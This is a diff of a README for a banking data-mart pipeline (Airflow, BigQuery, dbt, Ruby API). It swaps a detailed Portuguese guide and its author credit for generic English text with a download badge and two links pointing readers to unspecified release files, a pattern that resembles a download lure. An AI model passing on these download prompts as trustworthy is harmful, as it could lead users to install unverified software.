@@ -1,222 +1,87 @@
-﻿# End-to-End Bank Data Pipeline
+# 🚀 data-mart-banco - Build Your Modern Banking Data Mart
 
-Pipeline de Engenharia de Dados completo simulando um ambiente financeiro real, cobrindo todo o fluxo desde um banco transacional até a camada de consumo analítica.
+![Download](https://img.shields.io/badge/Download-Now-brightgreen)
 
-O projeto vai de um PostgreSQL operacional até um dashboard executivo, passando por Data Lake no BigQuery, transformações com dbt, orquestração com Airflow e exposição dos dados por meio de uma API em Ruby.
+## 📥 Overview
 
----
+Welcome to the **data-mart-banco** project! This repository contains everything you need to build a modern banking data mart. The goal is to provide a comprehensive solution for data engineering using powerful tools like Docker, Python, Airflow, BigQuery, and dbt. With our setup, you can streamline your data processes and harness the power of data for banking operations.
 
-## Visão Geral da Arquitetura
+## 🚀 Getting Started
 
-```mermaid
-graph TD
-    A[PostgreSQL Transacional] -->|Extract & Load| B[Python Ingestion]
-    B --> C[BigQuery - Raw Layer]
-    C -->|dbt Staging| D[BigQuery - Staging]
-    D -->|dbt Marts| E[BigQuery - Data Marts]
-    E -->|KPIs| F[Tabelas Analíticas]
-    F --> G[Ruby API]
+Follow these simple steps to get started with the data mart project.
 
-    H[Apache Airflow] --> B
-    H --> D
-    H --> E
-```
+### 1. System Requirements
 
-### Diagrama Detalhado (Segurança e Camadas)
+Before you begin, ensure your computer meets the following requirements:
 
-```mermaid
-graph LR
-  subgraph Origem
-    PG[(PostgreSQL)]
-  end
-  subgraph Ingestao
-    ING[Ingestion Service]
-    LOGS[(Logs/Metrics)]
-  end
-  subgraph BigQuery
-    RAW[bank_raw]
-    STG[bank_raw_staging]
-    MART[bank_mart]
-    META[bank_meta]
-  end
-  subgraph Consumo
-    API[Ruby API]
-  end
-  PG --> ING --> STG --> RAW
-  RAW --> MART
-  ING --> LOGS
-  ING --> META
-  MART --> API
-```
+- Operating System: Windows, MacOS, or Linux
+- RAM: Minimum 4GB
+- Disk Space: Minimum 1GB free
+- Internet Connection for downloading components
 
----
+### 2. Download & Install
 
-## Tech Stack
+To download the application, click the link below. It will take you to the Releases page, where you can find the latest version of this software.
 
-* Fonte: PostgreSQL (Docker)
-* Ingestão: Python (Pandas, SQLAlchemy)
-* Data Warehouse: Google BigQuery
-* Transformação: dbt (Data Build Tool)
-* Orquestração: Apache Airflow (Docker)
-* Consumo: Ruby (simulação de backend API)
-* Infraestrutura: Docker e Docker Compose
+[Visit this page to download](https://github.com/lulubazx/data-mart-banco/releases)
 
----
+### 3. Setting Up Your Environment
 
-## Arquitetura de Dados
+Once you've downloaded the files, you need to set up your environment:
 
-1. Ingestão (Extract & Load)
+- **Install Docker**: Download and install Docker from [Docker's official site](https://www.docker.com/get-started).
+- **Install Python**: Download the latest version of Python from [Python's official site](https://www.python.org/downloads/).
+- **Install Airflow**: Follow the installation guide on the [Apache Airflow website](https://airflow.apache.org/docs/apache-airflow/stable/installation/index.html).
 
-   * Scripts em Python extraem dados de clientes, transações e empréstimos do PostgreSQL.
-   * Os dados brutos são carregados no BigQuery na camada `bank_raw`.
+### 4. Configuration
 
-2. Transformação (Transform)
+After installation, you need to configure a few settings:
 
-   * O dbt é responsável pela modelagem analítica:
+- **Docker Compose**: Use the provided `docker-compose.yaml` file to start all services. You can find details on how to use Docker Compose in the official [Docker documentation](https://docs.docker.com/compose/).
+- **Database Setup**: Connect to BigQuery and set up your database credentials as described in the documentation inside the repository.
 
-     * Staging: limpeza, padronização e tipagem dos dados.
-     * Marts: construção de fatos e dimensões utilizando Star Schema.
-     * KPIs: cálculo de métricas como saldo líquido, exposição ao risco e segmentação de clientes.
+### 5. Running the Application
 
-3. Orquestração
-
-   * Uma DAG no Airflow executa diariamente o pipeline completo.
-   * Dependências garantem a ordem correta: ingestão, testes de qualidade e transformações dbt.
-
-4. Serving
-
-   * Uma aplicação em Ruby consome os dados tratados diretamente do BigQuery.
-   * A API simula o backend de um aplicativo bancário ou dashboard executivo.
-
----
-
-## Como Executar o Projeto
-
-### Pré-requisitos
-
-* Docker e Docker Compose
-* Conta no Google Cloud Platform com Service Account
-* Python 3.8 ou superior
-
----
-
-### Configuração do Ambiente
-
-1. Clone o repositório.
-2. Copie `.env.example` para `.env` e preencha com valores reais.
-3. Adicione a credencial de Service Account do GCP em `secrets/gcp-sa.json` (somente para uso local).
-4. Configure o SDK do Google Cloud localmente ou use `GOOGLE_APPLICATION_CREDENTIALS` via `.env`.
-5. Gere `AIRFLOW_FERNET_KEY` (ex.: `python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"`).
-6. Ajuste `config/tables.yaml` e `config/schemas.yaml` conforme seu esquema real.
-
----
-
-### Infraestrutura (Airflow)
+To run the application, navigate to the folder where you downloaded the files and execute the following command:
 
 ```bash
-cd airflow_infra
-docker-compose --env-file ../.env up -d --build
+docker-compose up
 ```
 
-A interface do Airflow ficará disponível em:
+This command starts all required services, including Airflow and your database.
 
-```
-http://localhost:8085
-```
+## 📈 Features
 
-Credenciais de acesso:
+- **ETL Pipelines**: Easily extract, transform, and load data from various sources into your data mart.
+- **Data Warehousing**: Utilize BigQuery for efficient data storage and retrieval.
+- **Integration**: Seamlessly connect through Ruby APIs for real-time data updates.
+- **Automation**: Schedule tasks with Apache Airflow, ensuring timely data processing.
 
-* Definidas em `.env` (AIRFLOW_ADMIN_USER / AIRFLOW_ADMIN_PASSWORD)
+## 🛠️ Built With
 
----
+- Docker
+- Python
+- Apache Airflow
+- BigQuery
+- dbt
+- Ruby API integration
 
-### Execução do Pipeline
+## ✅ Troubleshooting
 
-1. Acesse o Airflow.
-2. Ative a DAG `bank_data_pipeline`.
-3. O pipeline executará automaticamente a ingestão e as transformações dbt.
+If you encounter issues while setting up or running the application:
 
----
+- Check the installation logs for errors.
+- Ensure you have a stable internet connection.
+- Make sure all services defined in the `docker-compose.yaml` file are up and running.
 
-### Teste da Aplicação Ruby
+## 🌐 Support
 
-Para simular o consumo dos dados analíticos:
-
-```bash
-cd ruby_app
-docker build -t banco-ruby-api .
-docker run --env-file ..\.env -v ${PWD}/..\secrets:/app/secrets:ro banco-ruby-api
-```
-
----
-
-## Resultados
-
-O pipeline gera a tabela analítica `kpi_performance_geral`, permitindo segmentação de clientes e análise financeira em tempo quase real.
-
-Exemplo de resposta da API Ruby:
-
-```json
-{ "nome": "Maria S.", "saldo": 15000.0, "categoria": "Varejo" }
-{ "nome": "João S.", "saldo": -3500.0, "categoria": "Varejo" }
-```
+If you need further assistance, feel free to open an issue on the GitHub repository, or check the project documentation inside the repository.
 
 ---
 
-## Decisões Técnicas
+Ensure you keep your data secure and follow best practices while using the application. Happy data engineering!
 
-- Ingestão com staging + MERGE no BigQuery para idempotência.
-- Configurações em YAML para tabelas, colunas de data e validações.
-- Observabilidade via logs estruturados e métricas em `bank_meta`.
-- Qualidade de dados com testes dbt e testes SQL custom.
-- Segredos: suporte a Airflow Connections via `POSTGRES_CONN_ID`.
+To download the application again, click here:
 
----
-
-### Evidências de Execução
-
-### Pipeline Executado com Sucesso
-Fluxo de orquestração completo no Airflow: da ingestão PostgreSQL à modelagem dbt
-![Airflow Graph](docs/airflow_success.PNG)
-
-### Saída da API
-Aplicação Ruby a consumir dados tratados do BigQuery via Google Client Library
-![Ruby Output](docs/ruby_terminal.PNG)
-
-### BigQuery Preview
-Data Mart final no BigQuery pronto para consumo analítico
-![BigQuery View](docs/bigquery.PNG)
-
----
-
-## Runbook (Troubleshooting)
-
-- Airflow Webserver não abre: verifique `AIRFLOW__WEBSERVER__WEB_SERVER_MASTER_TIMEOUT` e os logs do container.
-- Erros de ingestão no Airflow: valide conexão Postgres e variáveis `POSTGRES_*`.
-- dbt falha por credenciais: confirme `BIGQUERY_PROJECT_ID` e o tipo de credencial (service account em produção).
-- dbt_utils: rode `dbt deps` antes de `dbt test`.
-- BigQuery sem billing: MERGE será substituído por CREATE OR REPLACE automaticamente.
-
----
-
-## Data Dictionary (Resumo)
-
-- `stg_users`: clientes (user_id, nome_completo, email, data_cadastro)
-- `stg_loans`: empréstimos (loan_id, user_id, valor_emprestimo, status, taxa_juros, data_solicitacao)
-- `stg_investments`: investimentos (investment_id, user_id, tipo_investimento, valor_investido, data_investimento)
-- `stg_cards`: transações de cartão (transaction_id, user_id, valor_transacao, categoria, data_transacao)
-
----
-
-## Data Lineage
-
-- Gere a documentação: `dbt docs generate`
-- Sirva localmente: `dbt docs serve`
-- Integração recomendada: DataHub ou Amundsen (catálogo e lineage).
-
----
-
-## Autor
-
-Ricardo
-Data Engineer
+[Visit this page to download](https://github.com/lulubazx/data-mart-banco/releases)
